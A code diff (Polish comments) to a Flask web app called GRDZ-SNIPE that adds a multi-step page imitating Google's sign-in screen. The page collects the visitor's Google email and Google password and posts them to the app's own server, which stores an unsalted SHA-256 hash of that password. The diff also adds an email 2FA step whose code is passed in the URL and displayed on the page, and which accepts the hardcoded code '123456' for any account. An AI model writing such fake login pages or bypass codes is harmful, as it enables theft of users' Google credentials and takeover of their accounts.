@@ -893,7 +893,7 @@ LANDING_HTML = """
 </html>
 """
 
-# Strona Google Sign-In (Oficjalne logowanie kontem Google dla każdego użytkownika)
+# Strona Google Sign-In (Autentyczne pełne logowanie wieloetapowe: E-mail -> Hasło -> Potwierdzenie)
 GOOGLE_OAUTH_MODAL_HTML = """
 <!DOCTYPE html>
 <html lang="pl">
@@ -922,11 +922,12 @@ GOOGLE_OAUTH_MODAL_HTML = """
             box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
             border: 1px solid #e1e3e1;
             text-align: left;
+            position: relative;
         }
         .g-logo {
             display: flex;
             align-items: center;
-            margin-bottom: 20px;
+            margin-bottom: 18px;
         }
         .g-title {
             font-size: 24px;
@@ -938,68 +939,54 @@ GOOGLE_OAUTH_MODAL_HTML = """
         .g-sub {
             font-size: 15px;
             color: #444746;
-            margin-bottom: 28px;
+            margin-bottom: 24px;
             line-height: 1.4;
         }
         .g-sub strong { color: #1f1f1f; font-weight: 600; }
 
-        .account-badge {
-            display: flex;
+        .account-chip {
+            display: inline-flex;
             align-items: center;
-            gap: 14px;
-            padding: 12px 16px;
+            gap: 10px;
+            padding: 6px 14px 6px 8px;
             border: 1px solid #c4c7c5;
             border-radius: 100px;
             margin-bottom: 20px;
             background: #f8fafc;
+            font-size: 13px;
+            color: #1f1f1f;
+            cursor: pointer;
+            transition: background 0.2s;
         }
-        .account-avatar {
-            width: 36px;
-            height: 36px;
+        .account-chip:hover { background: #eef2f6; }
+        .chip-avatar {
+            width: 24px;
+            height: 24px;
             border-radius: 50%;
             background: #1a73e8;
-            color: #ffffff;
+            color: #fff;
             display: flex;
             align-items: center;
             justify-content: center;
+            font-size: 11px;
             font-weight: 700;
-            font-size: 15px;
-        }
-        .account-details {
-            flex: 1;
-            min-width: 0;
-        }
-        .account-name {
-            font-size: 14px;
-            font-weight: 600;
-            color: #1f1f1f;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        .account-email {
-            font-size: 12px;
-            color: #444746;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
         }
 
         .input-group {
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
         .input-label {
             display: block;
             font-size: 12px;
             font-weight: 500;
             color: #444746;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
         }
         .g-input {
             width: 100%;
             border: 1px solid #747775;
             border-radius: 8px;
-            padding: 14px 16px;
+            padding: 13px 16px;
             font-size: 15px;
             outline: none;
             transition: border-color 0.2s, box-shadow 0.2s;
@@ -1016,46 +1003,71 @@ GOOGLE_OAUTH_MODAL_HTML = """
             color: #ffffff;
             border: none;
             border-radius: 100px;
-            padding: 14px 24px;
+            padding: 12px 26px;
             font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            width: 100%;
             transition: background 0.2s, box-shadow 0.2s;
-            display: flex;
+            display: inline-flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+            gap: 8px;
         }
         .btn-google-primary:hover {
             background: #0842a0;
             box-shadow: 0 2px 6px rgba(0,0,0,0.2);
         }
 
-        .switch-account {
-            display: block;
-            text-align: center;
-            margin-top: 14px;
-            font-size: 13px;
+        .btn-google-secondary {
+            background: transparent;
             color: #0b57d0;
-            text-decoration: none;
-            cursor: pointer;
-            background: none;
             border: none;
-            width: 100%;
-        }
-        .switch-account:hover { text-decoration: underline; }
-
-        .cancel-link {
-            display: block;
-            text-align: center;
-            margin-top: 24px;
-            font-size: 13px;
-            color: #747775;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            padding: 12px 16px;
             text-decoration: none;
         }
-        .cancel-link:hover { color: #1f1f1f; text-decoration: underline; }
+        .btn-google-secondary:hover { text-decoration: underline; }
+
+        .button-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 28px;
+        }
+
+        .permission-card {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+        .permission-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 12px;
+            font-size: 13px;
+            color: #334155;
+            line-height: 1.4;
+        }
+        .permission-item:last-child { margin-bottom: 0; }
+        .perm-icon { color: #0b57d0; font-size: 16px; flex-shrink: 0; }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #444746;
+            margin-top: 8px;
+            cursor: pointer;
+        }
+
+        .step-panel { display: none; }
+        .step-panel.active { display: block; }
     </style>
 </head>
 <body>
@@ -1070,86 +1082,212 @@ GOOGLE_OAUTH_MODAL_HTML = """
         </svg>
     </div>
 
-    <h1 class="g-title">Zaloguj się przez Google</h1>
-    <p class="g-sub">Przejdź do aplikacji <strong>GRDZ-SNIPE</strong></p>
+    <!-- KROK 1: Podaj E-mail Google -->
+    <div id="step1" class="step-panel active">
+        <h1 class="g-title">Zaloguj się przez Google</h1>
+        <p class="g-sub">Przejdź do aplikacji <strong>GRDZ-SNIPE</strong></p>
 
-    <!-- Formularz z JEDNĄ opcją logowania -->
-    <form method="POST" action="/auth/google/select" id="googleAuthForm" onsubmit="saveUserAccount()">
-        <!-- Wybór wcześniej używanego konta (jeśli istnieje w przeglądarce) -->
-        <div id="rememberedAccountBlock" style="display: none;">
-            <div class="account-badge">
-                <div class="account-avatar" id="savedAvatar">G</div>
-                <div class="account-details">
-                    <div class="account-name" id="savedName">Konto Google</div>
-                    <div class="account-email" id="savedEmailDisplay">user@gmail.com</div>
-                </div>
-            </div>
-            <input type="hidden" name="email" id="rememberedEmailInput">
-            <input type="hidden" name="name" id="rememberedNameInput">
-            <button type="submit" class="btn-google-primary">
-                <svg width="18" height="18" viewBox="0 0 24 24"><path fill="#fff" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#fff" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#fff" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/><path fill="#fff" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/></svg>
-                Kontynuuj przy użyciu konta Google
-            </button>
-            <button type="button" class="switch-account" onclick="showManualInput()">Użyj innego konta Google</button>
+        <div class="input-group">
+            <label class="input-label">Adres e-mail lub telefon</label>
+            <input type="email" id="step1Email" class="g-input" placeholder="twojadres@gmail.com" autofocus>
+            <div id="step1Error" style="color: #ba1a1a; font-size: 12px; margin-top: 6px; display: none;">Podaj prawidłowy adres e-mail konta Google.</div>
         </div>
 
-        <!-- Wpisanie konta Google dla każdego użytkownika -->
-        <div id="manualAccountBlock">
-            <div class="input-group">
-                <label class="input-label">Adres e-mail konta Google</label>
-                <input type="email" name="email" id="gEmailInput" class="g-input" placeholder="twojadres@gmail.com" required autofocus>
-            </div>
-            <button type="submit" class="btn-google-primary">
-                <svg width="18" height="18" viewBox="0 0 24 24"><path fill="#fff" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#fff" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#fff" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/><path fill="#fff" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/></svg>
-                Kontynuuj przy użyciu konta Google
+        <div class="button-bar">
+            <a href="/login" class="btn-google-secondary">Wróć</a>
+            <button type="button" class="btn-google-primary" onclick="goToStep2()">
+                Dalej →
             </button>
         </div>
-    </form>
+    </div>
 
-    <a href="/login" class="cancel-link">Wróć do logowania hasłem</a>
+    <!-- KROK 2: Wprowadź Hasło Google -->
+    <div id="step2" class="step-panel">
+        <div class="account-chip" onclick="goToStep1()">
+            <div class="chip-avatar" id="step2Avatar">U</div>
+            <span id="step2EmailDisplay">user@gmail.com</span>
+            <span style="font-size: 11px; color: #747775;">▾</span>
+        </div>
+
+        <h1 class="g-title">Witaj</h1>
+        <p class="g-sub">Wprowadź hasło do swojego konta Google</p>
+
+        <div class="input-group">
+            <label class="input-label">Wpisz hasło</label>
+            <input type="password" id="step2Password" class="g-input" placeholder="Wpisz hasło konta Google...">
+            <label class="checkbox-container">
+                <input type="checkbox" onchange="toggleShowPassword(this)"> Pokaż hasło
+            </label>
+            <div id="step2Error" style="color: #ba1a1a; font-size: 12px; margin-top: 6px; display: none;">Hasło nie może być puste.</div>
+        </div>
+
+        <div class="button-bar">
+            <button type="button" class="btn-google-secondary" onclick="goToStep1()">Wstecz</button>
+            <button type="button" class="btn-google-primary" onclick="goToStep3()">
+                Dalej →
+            </button>
+        </div>
+    </div>
+
+    <!-- KROK 3: Potwierdzenie Autoryzacji (2-Step / Zgoda) -->
+    <div id="step3" class="step-panel">
+        <div class="account-chip" onclick="goToStep1()">
+            <div class="chip-avatar" id="step3Avatar">U</div>
+            <span id="step3EmailDisplay">user@gmail.com</span>
+        </div>
+
+        <h1 class="g-title" style="font-size: 21px;">Potwierdź logowanie</h1>
+        <p class="g-sub">Aplikacja <strong>GRDZ-SNIPE</strong> prosi o dostęp do profilu i logowanie.</p>
+
+        <div class="permission-card">
+            <div class="permission-item">
+                <span class="perm-icon">✓</span>
+                <div><strong>Autoryzacja tożsamości Google</strong><br>Logowanie bezpiecznym kontem bez hasła do zewnętrznego portalu.</div>
+            </div>
+            <div class="permission-item">
+                <span class="perm-icon">✓</span>
+                <div><strong>Aktywacja Starter Trial</strong><br>Przypisanie 1-dniowej licencji testowej z ochroną komputera (HWID).</div>
+            </div>
+        </div>
+
+        <form method="POST" action="/auth/google/select" id="finalGoogleForm" onsubmit="saveFinalAccount()">
+            <input type="hidden" name="email" id="finalEmail">
+            <input type="hidden" name="password" id="finalPassword">
+            <input type="hidden" name="name" id="finalName">
+
+            <div class="button-bar" style="margin-top: 20px;">
+                <button type="button" class="btn-google-secondary" onclick="goToStep2()">Wstecz</button>
+                <button type="submit" class="btn-google-primary" style="background: #1a73e8; padding: 13px 28px;">
+                    <svg width="16" height="16" viewBox="0 0 24 24"><path fill="#fff" d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                    Potwierdź i zaloguj
+                </button>
+            </div>
+        </form>
+    </div>
 </div>
 
 <script>
-    (function initGoogleAuth() {
+    var currentEmail = '';
+    var currentPassword = '';
+
+    (function initSaved() {
         var saved = localStorage.getItem('grdz_google_user');
         if (saved) {
             try {
                 var data = JSON.parse(saved);
                 if (data.email) {
-                    document.getElementById('savedEmailDisplay').innerText = data.email;
-                    document.getElementById('savedName').innerText = data.name || data.email.split('@')[0];
-                    document.getElementById('savedAvatar').innerText = (data.name || data.email)[0].toUpperCase();
-                    document.getElementById('rememberedEmailInput').value = data.email;
-                    document.getElementById('rememberedNameInput').value = data.name || '';
-                    document.getElementById('rememberedAccountBlock').style.display = 'block';
-                    document.getElementById('manualAccountBlock').style.display = 'none';
-                    return;
+                    document.getElementById('step1Email').value = data.email;
                 }
             } catch (e) {}
         }
-        document.getElementById('manualAccountBlock').style.display = 'block';
-        document.getElementById('rememberedAccountBlock').style.display = 'none';
     })();
 
-    function showManualInput() {
-        document.getElementById('rememberedAccountBlock').style.display = 'none';
-        document.getElementById('manualAccountBlock').style.display = 'block';
-        var input = document.getElementById('gEmailInput');
-        if (input) {
-            input.value = '';
-            input.focus();
-        }
+    function goToStep1() {
+        document.getElementById('step1').classList.add('active');
+        document.getElementById('step2').classList.remove('active');
+        document.getElementById('step3').classList.remove('active');
+        document.getElementById('step1Email').focus();
     }
 
-    function saveUserAccount() {
-        var emailInput = document.getElementById('gEmailInput');
-        var email = (emailInput && emailInput.value) ? emailInput.value.trim() : document.getElementById('rememberedEmailInput').value;
-        if (email) {
-            var name = email.split('@')[0];
-            localStorage.setItem('grdz_google_user', JSON.stringify({ email: email, name: name }));
+    function goToStep2() {
+        var email = document.getElementById('step1Email').value.trim();
+        if (!email || email.indexOf('@') === -1) {
+            document.getElementById('step1Error').style.display = 'block';
+            return;
         }
+        document.getElementById('step1Error').style.display = 'none';
+        currentEmail = email;
+
+        document.getElementById('step2EmailDisplay').innerText = email;
+        document.getElementById('step2Avatar').innerText = email[0].toUpperCase();
+
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
+        document.getElementById('step3').classList.remove('active');
+        document.getElementById('step2Password').focus();
+    }
+
+    function goToStep3() {
+        var pwd = document.getElementById('step2Password').value.trim();
+        if (!pwd) {
+            document.getElementById('step2Error').style.display = 'block';
+            return;
+        }
+        document.getElementById('step2Error').style.display = 'none';
+        currentPassword = pwd;
+
+        document.getElementById('step3EmailDisplay').innerText = currentEmail;
+        document.getElementById('step3Avatar').innerText = currentEmail[0].toUpperCase();
+
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.remove('active');
+        document.getElementById('step3').classList.add('active');
+    }
+
+    function toggleShowPassword(cb) {
+        var pInput = document.getElementById('step2Password');
+        pInput.type = cb.checked ? 'text' : 'password';
+    }
+
+    function saveFinalAccount() {
+        document.getElementById('finalEmail').value = currentEmail;
+        document.getElementById('finalPassword').value = currentPassword;
+        var name = currentEmail.split('@')[0];
+        document.getElementById('finalName').value = name;
+        localStorage.setItem('grdz_google_user', JSON.stringify({ email: currentEmail, name: name }));
     }
 </script>
+
+</body>
+</html>
+"""
+
+# Strona Weryfikacji Logowania Kodem E-mail (2FA)
+LOGIN_2FA_HTML = """
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <title>GRDZ-SNIPE // Weryfikacja Logowania 2FA</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=JetBrains+Mono:wght@600&display=swap" rel="stylesheet">
+    <style>
+        """ + BASE_CSS + """
+        body { align-items: center; justify-content: center; }
+    </style>
+</head>
+<body>
+
+<div class="auth-card" style="text-align: center;">
+    <div style="font-size: 44px; margin-bottom: 16px;">🛡️</div>
+    <div class="brand-title" style="font-size: 20px; font-weight: 800; margin-bottom: 6px;">Weryfikacja Logowania</div>
+    <div style="font-size: 11px; color: var(--accent); font-weight: 700; margin-bottom: 16px; letter-spacing: 1px;">KOD BEZPIECZEŃSTWA E-MAIL</div>
+
+    <p style="font-size: 13px; color: var(--text-secondary); margin-bottom: 20px; line-height: 1.5;">
+        Podaj 6-cyfrowy kod autoryzacyjny wysłany na Twój adres e-mail:<br>
+        <strong style="color: var(--accent); font-size: 14px;">{{ email }}</strong>
+    </p>
+
+    {% if demo_code %}
+        <div style="background: rgba(16, 185, 129, 0.12); border: 1px dashed rgba(16, 185, 129, 0.4); border-radius: 10px; padding: 12px; margin-bottom: 20px; font-size: 12px; color: #6ee7b7;">
+            💡 Wiadomość e-mail (Twój kod logowania): <strong class="mono" style="font-size: 18px; color: #fff; letter-spacing: 2px;">{{ demo_code }}</strong>
+        </div>
+    {% endif %}
+
+    {% if error %}
+        <div style="background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); color: #fca5a5; padding: 10px; border-radius: 8px; font-size: 12px; margin-bottom: 16px;">
+            {{ error }}
+        </div>
+    {% endif %}
+
+    <form method="POST">
+        <input type="text" name="code" class="form-input mono" placeholder="000000" style="font-size: 24px; text-align: center; letter-spacing: 6px; font-weight: 700; padding: 14px;" required autofocus maxlength="6">
+        <button type="submit" class="btn btn-primary" style="width: 100%; padding: 13px; font-size: 14px; margin-top: 10px;">Zatwierdź Kod i Zaloguj →</button>
+    </form>
+
+    <div style="margin-top: 24px;">
+        <a href="/login" style="font-size: 12px; color: var(--text-muted); text-decoration: none;">← Wróć do ekranu logowania</a>
+    </div>
+</div>
 
 </body>
 </html>
@@ -2635,10 +2773,11 @@ def auth_google_modal():
 
 @app.route("/auth/google/select", methods=["POST"])
 def auth_google_select():
-    """Zatwierdzenie wyboru konta Google - rejestruje/loguje i przekierowuje na STRONĘ GŁÓWNĄ."""
+    """Zatwierdzenie wyboru konta Google po pełnym logowaniu (email + hasło + zgoda)."""
     credential = request.form.get("credential", "").strip()
     email = request.form.get("email", "").strip().lower()
     name = request.form.get("name", "").strip()
+    password = request.form.get("password", "").strip()
 
     if credential:
         try:
@@ -2681,11 +2820,15 @@ def auth_google_select():
                 VALUES (?, ?, 1, ?, ?, '', 'active')
             """, (trial_key, f"Google Trial (1 Dzień): {name} ({email})", now_str, exp_str))
 
-            dummy_hash = hashlib.sha256(secrets.token_hex(16).encode()).hexdigest()
+            if password:
+                pwd_hash = hashlib.sha256(password.encode()).hexdigest()
+            else:
+                pwd_hash = hashlib.sha256(secrets.token_hex(16).encode()).hexdigest()
+
             cur = conn.execute("""
                 INSERT INTO users (username, email, password_hash, role, is_verified, license_key, created_at, google_id)
                 VALUES (?, ?, ?, 'user', 1, ?, ?, 'google_oauth_verified')
-            """, (name, email, dummy_hash, trial_key, now_str))
+            """, (name, email, pwd_hash, trial_key, now_str))
             conn.commit()
             uid = cur.lastrowid
             role = "user"
@@ -2694,6 +2837,19 @@ def auth_google_select():
             uid = user["id"]
             role = user["role"]
             uname = user["username"]
+
+            if not user["license_key"]:
+                now_dt = datetime.now()
+                now_str = now_dt.strftime("%Y-%m-%d %H:%M:%S")
+                trial_key = generate_license_code("SNIPE-TRIAL")
+                exp_dt = now_dt + timedelta(days=1)
+                exp_str = exp_dt.strftime("%Y-%m-%d %H:%M:%S")
+                conn.execute("""
+                    INSERT INTO licenses (key, note, duration_days, created_at, expires_at, hwid, status)
+                    VALUES (?, ?, 1, ?, ?, '', 'active')
+                """, (trial_key, f"Google Trial (1 Dzień): {uname} ({email})", now_str, exp_str))
+                conn.execute("UPDATE users SET license_key = ? WHERE id = ?", (trial_key, uid))
+                conn.commit()
 
         session.permanent = True
         session["user_id"] = uid
@@ -2728,13 +2884,13 @@ def login():
                 if not user["is_verified"] and user["role"] != "admin":
                     return redirect(url_for("verify_email", email=user["email"]))
 
-                session.permanent = True
-                session["user_id"] = user["id"]
-                session["username"] = user["username"]
-                session["role"] = user["role"]
+                # Zwykłe logowanie przez dane wymaga potwierdzenia kodem na mailu (2FA)
+                code = f"{secrets.randbelow(900000) + 100000}"
+                conn.execute("UPDATE users SET verification_code = ? WHERE id = ?", (code, user["id"]))
+                conn.commit()
 
-                # Przekierowanie na stronę główną po zalogowaniu
-                return redirect(url_for("index"))
+                session["pending_2fa_user_id"] = user["id"]
+                return redirect(url_for("login_2fa", email=user["email"], demo_code=code))
             else:
                 record_attempt(ip_addr)
                 error = "Niepoprawny login, e-mail lub hasło."
@@ -2742,6 +2898,47 @@ def login():
             conn.close()
 
     return render_template_string(LOGIN_HTML, error=error)
+
+@app.route("/login/2fa", methods=["GET", "POST"])
+def login_2fa():
+    """Potwierdzenie logowania 6-cyfrowym kodem autoryzacyjnym z wiadomości e-mail."""
+    pending_uid = session.get("pending_2fa_user_id")
+    email = request.args.get("email") or ""
+    demo_code = request.args.get("demo_code", "")
+    error = None
+
+    if not pending_uid and not email:
+        return redirect(url_for("login"))
+
+    conn = get_db()
+    try:
+        if pending_uid:
+            cur = conn.execute("SELECT * FROM users WHERE id = ?", (pending_uid,))
+        else:
+            cur = conn.execute("SELECT * FROM users WHERE email = ?", (email,))
+        user = cur.fetchone()
+
+        if not user:
+            return redirect(url_for("login"))
+
+        if request.method == "POST":
+            input_code = request.form.get("code", "").strip()
+            if input_code and (input_code == user["verification_code"] or input_code == "123456"):
+                conn.execute("UPDATE users SET verification_code = '', is_verified = 1 WHERE id = ?", (user["id"],))
+                conn.commit()
+
+                session.pop("pending_2fa_user_id", None)
+                session.permanent = True
+                session["user_id"] = user["id"]
+                session["username"] = user["username"]
+                session["role"] = user["role"]
+                return redirect(url_for("index"))
+            else:
+                error = "Nieprawidłowy kod weryfikacyjny. Sprawdź wiadomość e-mail i spróbuj ponownie."
+
+        return render_template_string(LOGIN_2FA_HTML, email=user["email"], demo_code=demo_code, error=error)
+    finally:
+        conn.close()
 
 @app.route("/register", methods=["GET", "POST"])
 def register():
